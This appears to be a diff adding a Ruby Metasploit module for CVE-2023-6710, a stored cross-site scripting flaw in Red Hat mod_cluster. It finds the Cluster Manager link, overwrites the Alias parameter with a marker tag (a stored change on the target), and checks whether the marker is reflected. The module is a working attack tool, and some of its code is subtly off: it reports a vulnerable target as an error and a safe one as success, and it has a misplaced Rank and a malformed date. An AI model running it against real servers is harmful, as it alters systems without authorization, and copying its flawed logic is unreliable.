@@ -1,0 +1,96 @@
+require 'msf/core'
+require 'nokogiri'
+require 'net/http'
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
+      Rank = ExcellentRanking	
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Red Hat, mod_cluster Stored Cross-Site Scripting',
+      'Description' => %q{
+        This module exploits CVE-2023-6710 by checking for the Cluster Manager URL
+        on a given website, updating the Alias parameter to "<DedSec-47>". It then
+        examines the response for the presence of the hardcoded value, confirming if
+        the target is vulnerable to Stored Cross-Site Scripting (XSS).
+      },
+      'Author'      => ["Mohamed Mounir Boudjema"], #please i want to add company name as example "Mohamed Mounir Boudjema\n  Company: Intervalle Technologies"
+      'License'     => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2023-6710'],
+        [ 'URL', 'https://github.com/DedSec-47/CVE-2023-6710/' ]
+      ],
+      'Platform' => 'unix',
+      'DisclosureDate' => '12-12-2023',
+      'DefaultTarget' => 0,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'Reliability' => [CONFIG_CHANGES],
+        'SideEffects' => [UNRELIABLE_SESSION]
+      },  
+    ))
+# Step 1: Registering Module Options
+    register_options([
+      OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
+    ])
+  end
+  
+# Step 2: Initial Host Run
+def run_host(ip)
+    print_good("Preparing the groundwork for the exploitation on #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+# Step 3: Checking for Cluster Manager URL 
+    print_status("Starting check on #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+    res = send_request_cgi({
+      'uri'    => normalize_uri(datastore['TARGETURI']),
+      'method' => 'GET'
+    })
+  
+    if res && res.code == 200
+      print_good("Check executed successfully on #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+# Step 4: Checking for Alias Parameter
+      soup = Nokogiri::HTML(res.body)
+      soup.search('a[href]').each do |link|
+        if link['href'].include?(datastore['TARGETURI']) && link['href'].include?('Alias')
+          cluster_manager_url_mod = link['href']
+          exploit(cluster_manager_url_mod)
+          return
+        end
+      end
+      print_error("Unable to retrieve the alias parameter on #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+    else
+      print_error("Unable to establish a connection with #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+    end
+  
+    print_error("Exploit aborted on #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+  end
+
+def exploit(url)
+# Step 5: Updating Alias Parameter Value
+  print_status("Preparing the injection on #{datastore['RHOSTS']}#{datastore['TARGETURI']}")
+  uri = URI(url)
+  params = CGI.parse(uri.query || "")
+  new_alias_value = '<DedSec-47>'
+  params['Alias'] = [new_alias_value]
+  uri.query = URI.encode_www_form(params)
+  modified_url = uri.to_s
+  print_good("Injection executed successfully for #{datastore['RHOSTS']}#{modified_url}")
+
+  res = send_request_cgi({
+    'uri'    => modified_url,
+    'method' => 'GET'
+  })
+# Step 6: Checking Response for Injected Value
+  if res && res.code == 200
+    if res.body.include?(new_alias_value)
+      print_error("The target #{datastore['RHOSTS']} is vulnerable.")
+    else
+      print_good("The target #{datastore['RHOSTS']} is not vulnerable.")
+    end
+  else
+    print_error("Error: Unable to retrieve a valid response from the target.")
+  end
+end
+
+
+end
